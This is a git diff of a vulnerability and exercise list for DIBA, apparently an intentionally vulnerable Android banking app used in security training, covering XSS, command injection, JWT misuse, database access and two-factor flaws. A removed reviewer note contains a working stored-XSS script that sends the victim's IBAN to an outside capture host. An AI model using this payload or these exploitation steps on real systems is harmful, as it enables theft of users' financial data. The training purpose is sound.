@@ -6,56 +6,15 @@ Most of the vulnerabilities are within the app. However, there are also a few vu
 
 The vulnerabilites are rated as *easy*, *medium* and *hard*, giving an indication for the complexity of exploiting them. This complexity rating reflects the general effort and knowledge (also of helpful tools) required for exploitation. 
 
-### General issues
+TODO:
 
 The "Reset App" button resets a lot, but it does not reset the list of payments. Could you add this? It also does not reset the currency exchamnge rates.
 
-App Settings screen needs better formatting.
-
 Add license files & information.
 
-Replace "please update to receive the messages" with a text that tells the user what to do.
+Use DIBA logo also for the exploit app, but with a little difference to the real app. As the logo looks similar to the one of DIBA: An alternative would be to use the same logo as the bank, but with a big red E in the top right corner?
 
-Use DIBA logo also for the exploit ab, but with a little difference to the real app. As the logo looks similar to the one of DIBA: An alternative would be to use the same logo as the bank, but with a big red E in the top right corner?
-
-Menu should be:
-
-Intend redirection attack: value "1000" is set to wrong Extra.
-You changed the wrong value: You must set the amountSFr to 1000, not the amount, because this is the actual money that is transferred.
-
-DIBA-Exploit Logo
-
-How to reset server?
-
-And can you rename the REDIRECT button to CHANGE DEBUG SETTINGS?
-
-WebView:
-
-Works. Use the following text on the servey page:
-
-Your recently opened account IBAN:
-
-Please let us know what you think - provide a comment and a score from 1 (bad) to 5 (very good).
-
-And make sure to us good comments already in there, so use the following 3 examples:
-
-5: Very good service, thank you!
-
-3:  It’s OK, but I’ve seen better apps.
-
-2: Not happy, I’m thinking about using another bank. 
-
-Messages:
-
-I don’t think these hints are very good so if used, we would have to adapt them. We leave the feature with "hint" in the app, but we shouldn’t tell the user about it. Let’s just use this welcome message:
-
-"Here you can send messages to the bank. You can also search for messages you sent and received before."
-
-Exploit App:
-
-Use this welcome text:
-
-DIBA exploit was developed by the DIBA team. It allows to exploit some of the vulnerabilities in DIBA. You can select the vulnerability to exploit in the menu.
+Check that when cloning the server and starting it for the first time, no server-side data is there. I think I just downloaded the server, started it, and went to teh survey and there were more than the three standard messahes listed (?)
 
 Complete:
 
@@ -71,6 +30,23 @@ Complete:
 - 10: ok
 - 11: solution adaptation
 - 12: solution adaptation
+
+- 13: solution adaptation
+- 14: solution adaptation
+- 15: solution adaptation
+
+- 24: ok
+- 25: ok
+- 26: solution adaptation (?), as not working on Ubuntu
+- 27: solution adaptation
+- 28: solution adaptation
+- 29: solution does not work for me
+- 30: ok
+- 31: solution adaptation
+- 32: solution adaptation
+- 33: solution adaptation
+
+
 
 
 
@@ -164,9 +140,7 @@ Note: Code is obfuscated and hard to learn. However, looking at the encrypted re
 ### 14: JWT Validity (easy)
 If login is successful, the DIBA server sends a JSON Web Token (JWT) to the app, which is then included in every subsequent request by the app to link the request to the authenticated user. While JWTs in general are considered secure assuming they are used correctly, it's also possible to use them in an insecure way - which is what happened in DIBA.
 
-**Goal:** Get a JWT (e.g., by using an intercepor proxy) and analyze it's content (e.g., by using https://jwt.io). Identify one major problem with the content of the token and what the security implications are.
-
-**Check**: Works
+**Goal:** Get a JWT (e.g., by using an interceptor proxy) and analyze it's content (e.g., by using https://jwt.io). Identify one major problem with the content of the token and what the security implications are.
 
 ### 15: Recently Used Apps (easy)
 In Android, when displaying the currently running apps, screenshots are displayed that are taken when an app leaves the foreground. As the DIBA app sometimes shows sensitive information, it has been implemented in a way to make sure that 
@@ -249,20 +223,10 @@ Android apps can use internal SQlite databases. The DIBA app, for instance, uses
 
 **Goal:** Get access to the database that stores the investments and list the made investments.
 
-**Check**: Works
-
-OK, one small mistake in solution: Missing s
-
-sqlite3 investments
-
 ### 25: Native Language Library (hard)
-Vulnerability 26 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app.
+Vulnerability 26 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app, in a native language library.
 
 **Goal:** Find the key. When solving vulnerability 26, you'll learn whether you have found the right key.
-
-**Check**: Works
-
-OK, add to solution why you are searching for "*.so"
 
 ### 26: Encrypted SQLite Database (hard)
 Just like with investments (see vulnerability 25), a local database is also used to store the made payments. This time, the developers tried to come up with a more secure solution by encrypting the database with a key hidden in the app. However, assuming an attacker finds this key and gets access to the device, he can still get the database and read its potentially sensitive content.
@@ -273,43 +237,12 @@ Just like with investments (see vulnerability 25), a local database is also used
 
 **Hint:** In the DIBA app, encryption of the payment database is done using [SQLCipher](https://www.zetetic.net/sqlcipher/). Note that this vulnerability is not because a problem of SQLCipher, but because the attacker can get access to the encryption key.
 
-**Check**: Could not test as I couldn't build SQLCipher
-Add to solution how we can found out that sqlcipher is used.
-
-This does not work:
-marc@clt-mob-t-6316 Desktop % adb shell "run-as ch.zhaw.securitylab.DIBA cat databases/payments" > payments.db
-run-as: package not debuggable: ch.zhaw.securitylab.DIBA
-
-As an alternative, use adb shell, then su. The copy the db to, e.g., /sdcard and from there, copy it to the local system with adb pull
-
-
 ### 27: WebView Cross-Site Scripting (medium)
 The DIBA app provides a survey to banking customers so they can provide some feedback. This survey is implemented using a WebView that contains a stored Cross-Site Scripting (XSS) vulnerability.
 
 **Goal:** Exploit the vulnerability so that whenever a user opens the survey screen, his IBAN (which is included at the top of the screen) is sent in a request to a host controlled by the attacker.
 
 **Hint:** An easy way to capture request is by using [PostBin](https://postb.in).
-
-**Check**: Works
-
-Change texts as follows:
-
-Your recently opened account IBAN:
-
-Please let us know what you think - provide a comment and a score from 1 (bad) to 5 (very good).
-
-And make sure to us good comments already in there, so use the following 3 examples:
-
-5: Very good service, thank you!
-3:  It’s OK, but I’ve seen better apps.
-2: Not happy, I’m thinking about using another bank. 
-
-Note: I only could do string concatenation with the concat method, but not with "+":
-
-<script>
-new Image().src = encodeURI("https://postb.in/1589184632761-8206421809736?iban=".concat(document.getElementById('iban').text));
-</script>
-
 
 ### 28: Cracking Weak Password (hard)
 
@@ -319,18 +252,6 @@ To get access to stock market data, an access code must be entered. Due to a vul
 
 **Hint:** The code is based on a common word and additionally uses letter capitalization and digits.
 
-**Check**: Works. But the solution should be adapted:
-
-- How can the attacker find out that hashing with salt is used? So maybe a foirst step should be to look at one of the decompiled activities.
-
-- Current step 2: Show the content of the filw with real salt & hash
-
-- Also write that one can use also other crackers, so john is just an example
-
-- The format dynamic_61 should be explained. I sent you two links yesterday that behind this format, there is SHA256 over a concatenated salt and password. So just refer to the URL that describes all the formats and briefly write why dynamic_61 is used.
-
-And in the app: Clicking "Stock Market" button brings me to the stock market without any password? And what does the Suscribe button do? I’m not sure that this is implemented correctly. Can you please explain?
-
 ### 29: Root Detection Bypass (hard)
 The DIBA app cointains a simple root detection mechanism. Whenever the app is started, it checks whether the Android device is rooted and displays a message if this is the case. In reality, the app would be now terminated to prevent its usage on rooted (and therefore less secure) devices. However, as a user has full control over the app, he can adapt it by removing the root detection check and as a result of this, the app can also be used on rooted devices.
 
@@ -338,44 +259,20 @@ The DIBA app cointains a simple root detection mechanism. Whenever the app is st
 
 **Hint:** To do this, you have to decompile the app using *apktool*, adapt the code, recompile the app again using *apktool* and sign it with *apksigner*.
 
-**Check**: Works
-
-Check again with updated solution.
-
-Note: Finding this in smali is very difficult. How can the user find the correct code location?
-
-### 30: Local Command Injection
-In the Meta-Settings, there's a *Ping Server* functionality to ping the server using the configured IP address. This uses the *ping* command in the Android operating system. The output of the ping command can be seen in the Android log. This functionality contains a command injection vulnerability that allows an attacker to execute arbitrary command in the Android system.
+### 30: Local Command Injection (easy)
+In the Meta-Settings, there's a *Ping* functionality to ping the server using the configured IP address. This uses the *ping* command in the Android operating system. The output of the ping command can be seen in the Android log. This functionality contains a command injection vulnerability that allows an attacker to execute arbitrary command in the Android system.
 
 **Goal:** Exploit the vulnerability so that the content of the file *loginPreferences.xml* in shared preferences of the DIBA app is written to the Android log.
-
-**Check**: Works
-
-Write in the solution to use adb logcat to see the logs.
-
-And a problem in my VM: When entering the command, the PING button is no longer on the screen (I can go down with "Tab", but it’s of course not ideal… Maybe we can add the PING button next to the IP address?
 
 ### 31: Two-Factor Authentication I - Replaying Codes (easy)
 To confirm a payment, the user gets a payment confirmation code by SMS. Note that the SMS is simulated and written to the server output. This code is generated and used in an insecure way. A first problem is that it is not bound to a specific payment and that it can be used for multiple payments until it expires (which is after 5 minutes) - so it's not a one time confirmation code as it is supposed to be. This means that, e.g., a MITM can wait until the user has made and confirmed one payment. Based on this, the MITM can then make several additional payments using this code while the code is valid.
 
-**Goal:** Exploit the vulnerability by reusing the payment code of a previous payment to confirm another payment. Obviously, this is trivial to do.
-
-**Check**: Works. But the solution should be adapted. Write that a code is valid for 5 minutes and during this time, can be used for any payment, also several times (it could even be used by other users).
-
-I also adapted the text in Vulnerabilities.md to give a realistic attack scenario with an MITM. In the solution, you are currently writing "Device Holder", but I’m not sure that makes sense?
+**Goal:** Act as a MITM using an interceptor proxy. Do a payment as the user of the app and learn (as the MITM) the payment confirmation code. Then, do another payment as the MITM by replaying the two original requests that were used during the payment, but change both the payment amount and the recipient of the payment in bith requests. Use the payment confirmation code you observed. The payment should be accepted by the server. You can verify successful exploitation by comparing the account balance before and after the payment.
 
 ### 32: Two-Factor Authentication II - Code not Bound to Payment (easy)
 Assume that the confirmation code can be used only once to confirm a payment (that's not the case, see vulnerability 31, but let's assume here it can only be used once). But it's still not bound to a specific payment. Try to exploit this by changing - as a MITM -  both the payment recipient and the payment amount that was originally entered by the user so that the payment with the changed amount and to a different recipient is executed. Note that the SMS message must appear harmless to the user, i.e., it must contain the originally entered payment amount and recipient.
 
 **Goal:** Exploit the vulnerability by successfully modifying a payment so that the payment amount is larger than originally entered by the user and that the payment goes to a different recipient. You can verify successful exploitation by comparing the account balance before and after the payment.
-
-**Check**: Works
-
-Actually, I think it works. I mean, it’s (almost) the same as is done by intent redirection, but here the modification is done as a MITM and not between the two app activities.. Please check the description I added to Vulnerabilities.md. It works, correct?
-
-In the made transactions list, there’s still the original recipient, but that’s because this takes the local information in the app, so it does not get the change done by the MITM. Correct?
-
-Please adapt solution accordingly. The problem here is of course, that the payment is included at all in the request with the code. This shouldn’t be done, so changing this after entering the code is not possible. Something like this should also be in the solution as a fix to the issue (and it’s basically also the solution to fix Vulnerability 31).
 
 ### 33: Two-Factor Authentication III - Weak Code Generation (medium)
 Confirmation codes should be random so an attacker cannot predict them. In the case of DIBA, however, they are not really created in a random way, although they appear to be quite random when looking at them.
@@ -383,8 +280,3 @@ Confirmation codes should be random so an attacker cannot predict them. In the c
 **Goal:** Crack the confirmation code generation algorithm. If you think you have cracked it, enter the confirmation code that would be used at 2030-01-31 12:00:00 in the code field and accept the payment. If the payment is accepted, you have successfully cracked the code generation algorithm.
 
 **Hint:** Code generation is based on a hash function.
-
-**Check**: Works, code 65a0be
-
-Adapt solution. Steps should show full solution, including solution. Here the attacker has "to guess" that SHA256 is used, right? But that’s OK, as it’s such a common hash function. I added a little hint.
-
